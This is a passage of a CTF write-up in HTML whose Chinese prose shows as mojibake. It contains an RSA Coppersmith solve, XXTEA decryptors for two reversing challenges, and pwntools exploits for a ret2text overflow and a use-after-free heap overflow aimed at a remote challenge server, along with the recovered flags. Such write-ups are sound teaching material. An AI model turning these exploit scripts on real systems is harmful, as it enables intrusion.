y * (n - z) - e * d_ + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, m + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, i + <span class="number">1</span>):</span><br><span class="line">        g = y**j * (e * M)**i * f**(m - i)</span><br><span class="line">        poly.append(g)</span><br><span class="line">        <span class="keyword">for</span> mono <span class="keyword">in</span> g.monomials():</span><br><span class="line">            monomials.add(mono)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, m + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t + <span class="number">1</span>):</span><br><span class="line">        h = z**j * (e * M)**i * f**(m - i)</span><br><span class="line">        poly.append(h)</span><br><span class="line">        <span class="keyword">for</span> mono <span class="keyword">in</span> h.monomials():</span><br><span class="line">            monomials.add(mono)</span><br><span class="line"></span><br><span class="line">monomials = <span class="built_in">sorted</span>(monomials)</span><br><span class="line">L = Matrix(ZZ, <span class="built_in">len</span>(poly), <span class="built_in">len</span>(monomials))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> row, shift <span class="keyword">in</span> <span class="built_in">enumerate</span>(poly):</span><br><span class="line">    <span class="keyword">for</span> col, monomial <span class="keyword">in</span> <span class="built_in">enumerate</span>(monomials):</span><br><span class="line">        L[row, col] = shift.monomial_coefficient(monomial) * monomial(Y, Z)</span><br><span class="line"></span><br><span class="line">res = L.LLL()</span><br><span class="line">vec1 = res[<span class="number">0</span>]</span><br><span class="line">vec2 = res[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">f1 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> idx, monomial <span class="keyword">in</span> <span class="built_in">enumerate</span>(monomials):</span><br><span class="line">    f1 += (vec1[idx] // monomial(Y, Z)) * monomial</span><br><span class="line">f1 = f1.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">f2 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> idx, monomial <span class="keyword">in</span> <span class="built_in">enumerate</span>(monomials):</span><br><span class="line">    f2 += (vec2[idx] // monomial(Y, Z)) * monomial</span><br><span class="line">f2 = f2.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">h = f1.sylvester_matrix(f2, y).det()</span><br><span class="line">h = h.univariate_polynomial().monic()</span><br><span class="line"></span><br><span class="line">roots = h.roots()</span><br><span class="line"><span class="built_in">print</span>(roots)  <span class="comment"># p+q-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># solve p,q</span></span><br><span class="line">P.&lt;p, q&gt; = PolynomialRing(ZZ)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">f1, f2</span>):</span><br><span class="line">    g = f1.resultant(f2, q)</span><br><span class="line">    roots = g.univariate_polynomial().roots()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(roots) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    p_ = <span class="built_in">abs</span>(roots[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    q_ = <span class="built_in">abs</span>(roots[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">min</span>(p_, q_), <span class="built_in">max</span>(p_, q_))</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">int</span>(roots[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">f1 = res - (p+q-<span class="number">1</span>)</span><br><span class="line">f2 = n - p*q</span><br><span class="line">p, q = solve(f1, f2)</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, f)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;Coppersmith_Lagrange_RSA_7f9d2b4e0a3c5e8g1h6j0k9l3m5n2p4q&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h3><p>MainActivityä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> setupClickListener$lambda$<span class="number">0</span>(MainActivity mainActivity, View view) &#123;</span><br><span class="line">    <span class="type">EditText</span> <span class="variable">editText</span> <span class="operator">=</span> mainActivity.etFlag;</span><br><span class="line">    <span class="keyword">if</span> (editText == <span class="literal">null</span>) &#123;</span><br><span class="line">        Intrinsics.throwUninitializedPropertyAccessException(<span class="string">&quot;etFlag&quot;</span>);</span><br><span class="line">        editText = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> StringsKt.trim((CharSequence) editText.getText().toString()).toString();</span><br><span class="line">    <span class="keyword">if</span> (obj.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        mainActivity.showMessage(<span class="string">&quot;è¯·è¾“å…¥flag&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mainActivity.checkFlag(obj)) &#123;</span><br><span class="line">        mainActivity.showMessage(<span class="string">&quot;ok&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        mainActivity.showMessage(<span class="string">&quot;no&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†ælibmyapplication.soï¼š</p><p><code>Java_com_example_myapplication_MainActivity_initNative</code> å‡½æ•°ä¸­ï¼Œ<code>sub_1838</code> æ˜¯AES-ECBç®—æ³•ï¼Œå¯†æ–‡ä»æ–‡ä»¶qwqeræ¥ï¼Œkey=â€p0l1stâ€=0x70306c31737400000000000000000000</p><p>è§£AESå¾—åˆ°elfæ–‡ä»¶ï¼Œå†åˆ†æelfï¼š</p><p><code>Java_com_qwq_ezapp_MainActivity_checkFlag</code> å‡½æ•°ä¸­ï¼Œ<code>`encrypt_string</code> æ˜¯XXTEAç®—æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">z, y, x, k, p, e</span>):</span><br><span class="line">    <span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = (rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        x = (x - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0xA56BABCD</span>, <span class="number">0x1F1234F1</span>, <span class="number">0x12345678</span>, <span class="number">0xFEDCBA98</span>]</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;1e86224f5efdbcb38252e24fffb382c90da769060f6eb7d5e77d3b9403cd5b28957bfd2270b963964f6fe2fe&#x27;</span>)</span><br><span class="line">encrypted = [bytes_to_long(c[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">decrypted = decrypt(encrypted, key)</span><br><span class="line">final = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(decrypted)):</span><br><span class="line">    final += long_to_bytes(decrypted[i])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(final)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;3afca981-b75b-435f-85ec-b2a3a85c4235&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Ezvm"><a href="#Ezvm" class="headerlink" title="Ezvm"></a>Ezvm</h3><p>ä¸»è¦é€»è¾‘åˆ†æï¼š</p><p><strong>åˆå§‹åŒ–æ•°æ®ï¼š</strong></p><p><code>v46</code>ï¼ˆä¸€ä¸ª 4 å…ƒç´ çš„ <code>__int64</code> æ•°ç»„ï¼‰å’Œ <code>v45</code>ï¼ˆå­—ç¬¦ä¸² <code>&quot;reverse1s3asy&quot;</code>ï¼Œé•¿åº¦ 13ï¼‰è¢«ç¡¬ç¼–ç ä¸ºåç»­æ“ä½œçš„å¯†é’¥æˆ–å¸¸é‡ã€‚</p><p><code>v29</code> åˆ° <code>v37</code> æ˜¯ä¸€ç»„é•¿åº¦ä¸º 9 çš„ æ“ä½œåºåˆ—ï¼ˆæˆ–æ“ä½œç ï¼‰ï¼š<code>0, 0, 1, 2, 0, 5, 2, 6, 0</code>ï¼Œä½†å®é™…ä½¿ç”¨çš„æ“ä½œåºåˆ—æ˜¯ <code>v29</code> åˆ° <code>v33</code> åŠå…¶åçš„ 5 ä¸ªå…ƒç´ ï¼Œå³ï¼š<code>0, 0, 1, 2, 0</code>ï¼ˆè¿™æ˜¯ç”± <code>v48 = 5i64</code> æ§åˆ¶çš„å¾ªç¯æ¬¡æ•°ï¼‰ã€‚</p><ul><li><code>v29</code> æ˜¯ä¸€ä¸ª 64 ä½æ•´æ•°ï¼Œåˆå§‹å€¼ä¸º <code>0i64</code>ã€‚</li><li><code>v30</code> åˆ° <code>v37</code> æ˜¯ 8 ä¸ª 32 ä½æ•´æ•°ï¼Œåˆå§‹å€¼ä¸º <code>0, 1, 2, 0, 5, 2, 6, 0</code>ã€‚</li><li>ä»£ç é€šè¿‡ <code>v27 = *(&amp;v29 + v52)</code> è¯»å–æ“ä½œç ï¼Œå½“ <code>v52</code> ä» 0 å¾ªç¯åˆ° 4 æ—¶ï¼Œè¯»å–çš„å€¼ä¾æ¬¡æ˜¯ï¼š<code>v29</code>ï¼ˆ0ï¼‰ï¼Œ<code>v30</code>ï¼ˆ0ï¼‰ï¼Œ<code>v31</code>ï¼ˆ1ï¼‰ï¼Œ<code>v32</code>ï¼ˆ2ï¼‰ï¼Œ<code>v33</code>ï¼ˆ0ï¼‰ã€‚</li><li><p>æœ€ç»ˆæ‰§è¡Œçš„æ“ä½œç åºåˆ—æ˜¯ï¼š<code>0, 0, 1, 2, 0</code>ã€‚</p></li><li><p>è°ƒç”¨ <code>sub_1400057D5(v28)</code> åˆå§‹åŒ–ä¸€ä¸ª æ ˆç»“æ„ï¼ˆæˆ–åŠ¨æ€æ•°ç»„ï¼‰ï¼Œç”¨äºå­˜å‚¨ä¸­é—´ç»“æœã€‚<code>v28</code> ç»“æ„ä½“å¯èƒ½åŒ…å«ä¸€ä¸ªæŒ‡å‘å †å†…å­˜çš„æŒ‡é’ˆã€å½“å‰å…ƒç´ ä¸ªæ•°ï¼ˆ<code>0</code>ï¼‰ã€å’Œå®¹é‡ï¼ˆ<code>64</code>ï¼‰ã€‚</p></li><li><p>è¾“å…¥ Flagï¼š</p><ul><li>ç¨‹åºæ‰“å°æç¤º <code>&quot;è¯·è¾“å…¥flag\n&quot;</code>ã€‚</li><li>é€šè¿‡ <code>fgets</code> è¯»å–ç”¨æˆ·è¾“å…¥åˆ° <code>Buffer</code>ï¼ˆæœ€å¤§ 256 å­—èŠ‚ï¼‰ã€‚</li><li><code>Size = strcspn(Buffer, &quot;\n&quot;)</code> è®¡ç®—å‡ºå®é™…è¾“å…¥å­—ç¬¦ä¸²ï¼ˆFlagï¼‰çš„é•¿åº¦ï¼ˆä¸åŒ…æ‹¬æ¢è¡Œç¬¦ï¼‰ã€‚</li><li>åˆ†é…å†…å­˜ <code>Block = malloc(Size)</code> å¹¶å°† Flag å¤åˆ¶åˆ° <code>Block</code> ä¸­ã€‚</li><li>Flag çš„æ•°æ® è¢«è®¾ç½®åˆ°å±€éƒ¨å˜é‡ <code>v38</code> (æŒ‡é’ˆ) å’Œ <code>v39</code> (é•¿åº¦) ä¸­ã€‚</li></ul></li></ul><p>ç¨‹åºè¿›å…¥ä¸€ä¸ªç”± <code>while (v51 &amp;&amp; v52 &lt; v48)</code> æ§åˆ¶çš„å¾ªç¯ï¼Œå¾ªç¯ 5 æ¬¡ï¼ˆå› ä¸º <code>v48 = 5i64</code>ï¼‰ï¼Œä¾æ¬¡æ‰§è¡Œæ“ä½œç åºåˆ— <code>0, 0, 1, 2, 0</code>ã€‚</p><p>è¿™ä¸ªå¾ªç¯æ“ä½œä¸€ä¸ª æ•°æ®æ ˆ <code>v28</code>ï¼Œæ ˆä¸­å­˜å‚¨çš„å…ƒç´ æ˜¯ <code>&lt;æŒ‡é’ˆ, é•¿åº¦&gt;</code> ç»“æ„ä½“ï¼ˆç±»ä¼¼äº C++ çš„ <code>std::vector&lt;char&gt;</code> æˆ– <code>std::string</code> çš„å®ç°ï¼‰ã€‚</p><p><strong>å‡½æ•° <code>sub_1400055A1</code>ï¼š</strong></p><p><code>sub_1400055A1(v19, v20, v21, v22, v23)</code></p><p>æ‰§è¡Œä¸€ä¸ªæ ¸å¿ƒè¿ç®—ï¼Œå°† <code>v20</code> (<code>&quot;reverse1s3asy&quot;</code>) å’Œ <code>v22</code> (<code>&quot;reverse1s3asy&quot;</code> çš„å‰¯æœ¬) ä½œä¸ºæ•°æ®å’Œå¯†é’¥è¿›è¡Œå¤„ç†ã€‚</p><p><code>sub_1400016CC</code></p><p>å°†è¾“å…¥æ•°æ®ï¼ˆ<code>v20</code>ï¼Œå³ <code>&quot;reverse1s3asy&quot;</code>ï¼‰ä»å­—èŠ‚æ•°ç»„è½¬æ¢ä¸º32 ä½æ•´æ•°æ•°ç»„ï¼ˆå¤§ç«¯æˆ–å°ç«¯å–å†³äºå¹³å°å’Œä»£ç ç»†èŠ‚ï¼Œä½†ä¸»è¦æ˜¯ 4 å­—èŠ‚ä¸€ç»„ï¼‰ã€‚</p><p><code>sub_140001917</code></p><p>å°†å¯†é’¥æ•°æ®ï¼ˆ<code>v22</code>ï¼Œå³ <code>&quot;reverse1s3asy&quot;</code> çš„å‰¯æœ¬ï¼‰çš„å‰ 16 å­—èŠ‚è½¬æ¢ä¸º 4 ä¸ª 32 ä½æ•´æ•°ï¼ˆå¯èƒ½æ˜¯ä¸€ä¸ª Key Scheduleï¼‰ã€‚</p><p><code>sub_1400054ED</code></p><p>è°ƒç”¨ä¸€ä¸ªè‡ªå®šä¹‰çš„è™šæ‹Ÿæœº/å­—èŠ‚ç è§£é‡Šå™¨æ¥å¯¹ 32 ä½æ•´æ•°æ•°ç»„è¿›è¡Œè¿ç®—ã€‚</p><ul><li><code>sub_140001A01</code> å’Œ <code>sub_140001ECF</code> è´Ÿè´£åˆå§‹åŒ–å’Œæ„å»ºå­—èŠ‚ç ã€‚</li><li><p><code>sub_140001AFC</code> æ˜¯ å­—èŠ‚ç è§£é‡Šå™¨ï¼Œä½¿ç”¨ 16 ä¸ª 32 ä½å¯„å­˜å™¨ï¼ˆ<code>v5</code>ï¼‰å’ŒçŠ¶æ€æ ‡å¿—ï¼ˆ<code>v7</code>ï¼‰æ¥æ‰§è¡Œæ“ä½œï¼Œæ“ä½œç ï¼ˆ<code>v4</code> çš„ä½å­—èŠ‚ï¼‰åŒ…æ‹¬ MOVã€ADDã€SUBã€XORã€SHLã€SHRã€ANDã€å†…å­˜è¯»å†™ï¼ˆä»è¾“å…¥æ•°æ® <code>a2</code> æˆ– Key <code>a3</code>ï¼‰ï¼Œä»¥åŠæ¡ä»¶è·³è½¬ã€‚è¿™ä¸ªå‡½æ•°æ˜¯å¯¹è¾“å…¥æ•°æ®è¿›è¡Œäº†å¤æ‚çš„ä½è¿ç®—å’Œé€»è¾‘è¿ç®—å˜æ¢ã€‚</p></li><li><p><code>sub_1400017FD</code> å°†è¿ç®—ç»“æœï¼ˆ32 ä½æ•´æ•°æ•°ç»„ï¼‰å†è½¬æ¢å› å­—èŠ‚æ•°ç»„ã€‚</p></li></ul><p>è¿›å…¥å…³é”®å¤„ç†å‡½æ•°ï¼š</p><p><code>__int64 __fastcall sub_7FF791B91ECF(_QWORD *a1, unsigned int a2)</code></p><p>æ ¹æ®å‚æ•°å¯ä»¥è¯†åˆ«ä¸ºç®—æ³•å¯èƒ½ä¸ºXXTEAï¼Œå°è¯•è§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">z, y, x, k, p, e</span>):</span><br><span class="line">    <span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = (rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        x = (x - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x65766572</span>,<span class="number">0x31657372</span>,<span class="number">0x73613373</span>,<span class="number">0x79</span>]</span><br><span class="line"></span><br><span class="line">encrypted = [<span class="number">0xBA1A9983</span>,<span class="number">0x792B1077</span>,<span class="number">0x3D5B128C</span>,<span class="number">0x68F0470C</span>,<span class="number">0x56DD5F08</span>,<span class="number">0x20633CE2</span>]</span><br><span class="line"></span><br><span class="line">decrypted = decrypt(encrypted, key)</span><br><span class="line">final = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(decrypted)):</span><br><span class="line">    final += long_to_bytes(decrypted[i])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(final)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;this_1s_3z_vmxxtea&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h3><p>ret2textã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;150.138.81.18&#x27;</span>,<span class="number">14536</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;input: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">win = <span class="number">0x4011dd</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>)+p64(ret)+p64(win)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h3><p>èœå•é¢˜ã€‚</p><p>create_noteé™åˆ¶æœ€å¤šç”³è¯·9ä¸ªï¼ŒåŒæ—¶ç”³è¯·ä¸€ä¸ª0x20çš„å †å—å­˜æ”¾æ•°æ®æŒ‡é’ˆï¼Œç”³è¯·å †å—å­˜æ”¾åœ¨v2+0x8ä½ç½®ï¼Œv2+0x10ä½ç½®å­˜æ”¾æ‰“å°å‡½æ•°åœ°å€ã€‚</p><p>delete_noteå­˜åœ¨uafæ¼æ´ã€‚</p><p>view_noteä½¿ç”¨é€šè¿‡è°ƒç”¨å †ä¸Šå­˜åœ¨çš„æŒ‡é’ˆï¼Œæ‰“å°æ¼æ´ç‚¹çš„ä½ç½®ã€‚</p><p>å…ˆé€šè¿‡view_noteå †æº¢å‡ºï¼Œè¦†ç›–ç”³è¯·çš„ç¬¬ä¸€ä¸ªå †å—çš„æ‰“å°æŒ‡é’ˆï¼Œå½“freeæ‰ä¸¤ä¸ªå †å—æ—¶ï¼Œåœ¨å­˜æ”¾sizeä½ç½®å­˜åœ¨æ”¾äº†ä¸€ä¸ªå †åœ°å€ï¼Œè€Œå­˜åœ¨å †å—åœ°å€çš„ä½ç½®ï¼Œå­˜åœ¨ä¸€ä¸ªheap_addr+0x10çš„ä½ç½®ã€‚å½“å†™å…¥æ•°æ®æ—¶ï¼Œè¾“å…¥é•¿åº¦ä¼šå˜å¾—å¾ˆå¤§ã€‚åŠ«æŒview_noteå‡½æ•°çš„è°ƒç”¨æŒ‡é’ˆä¸ºwinå‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;150.138.81.18&#x27;</span>,<span class="number">12491</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,msg</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;Content: &#x27;</span>,msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,msg</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;content: &#x27;</span>,msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x260</span>+<span class="number">0x40</span>)+p64(<span class="number">0x401236</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="PWN3"><a href="#PWN3" 